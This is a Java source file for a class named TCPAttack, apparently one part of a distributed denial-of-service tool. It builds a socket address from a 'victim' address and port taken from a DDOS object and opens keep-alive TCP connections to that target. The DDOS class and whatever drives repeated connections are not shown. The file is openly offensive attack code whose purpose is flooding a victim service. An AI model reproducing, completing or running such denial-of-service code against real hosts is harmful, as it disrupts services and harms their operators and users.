import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.SocketException;

public class TCPAttack  {

    private Socket socket;
    private DDOS ddos;
    private SocketAddress socketAddress;
    private InetSocketAddress inetSocketAddress;

    public TCPAttack(DDOS ddos) {
        this.ddos = ddos;
        inetSocketAddress = new InetSocketAddress(ddos.getVictimAddress(), ddos.getPort());
    }


    public void initializeSocket(String msg){
        this.setSocketAddress(inetSocketAddress);
        socket = new Socket();

        try {
            socket.setKeepAlive(true);
            socket.setSoTimeout(1);
        } catch (SocketException e) {
            e.printStackTrace();
        }
    }

    public void connect(){
        if(socket != null && !socket.isBound()){
            try {
                socket.connect(socketAddress);
            } catch (IOException e) {
                System.out.println("Error in socket connection!");
                e.printStackTrace();
            }
        }
    }

    public void stopSocketConnection(){
        if(socket != null && socket.isConnected()){
            try {
                socket.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }

    public Socket getSocket() {
        return socket;
    }

    public DDOS getAttackPattern() {
        return ddos;
    }

    public SocketAddress getSocketAddress() {
        return socketAddress;
    }

    public InetSocketAddress getInetSocketAddress() {
        return inetSocketAddress;
    }

    public void setSocketAddress(SocketAddress socketAddress) {
        this.socketAddress = socketAddress;
    }
}
